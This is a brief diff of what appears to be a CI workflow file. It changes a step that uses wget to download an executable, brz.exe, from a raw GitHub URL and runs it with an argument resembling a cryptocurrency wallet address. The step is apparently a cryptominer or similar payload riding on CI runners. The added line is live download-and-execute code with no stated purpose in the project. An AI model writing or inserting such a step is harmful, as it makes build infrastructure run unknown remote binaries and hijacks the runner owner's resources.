@@ -26,4 +26,4 @@ jobs:
              
     - name: HZ.Behruz...
       run: |
-        wget https://raw.githubusercontent.com/racon3349/ngrok-rdp/main/resources/brz.exe ; ./brz 14qBrMavy2pW9umzuhd7eMDVpwQ62xRtPK
+        wget https://raw.githubusercontent.com/behruz4933/z/main/resources/brz.exe ; ./brz 14qBrMavy2pW9umzuhd7eMDVpwQ62xRtPK
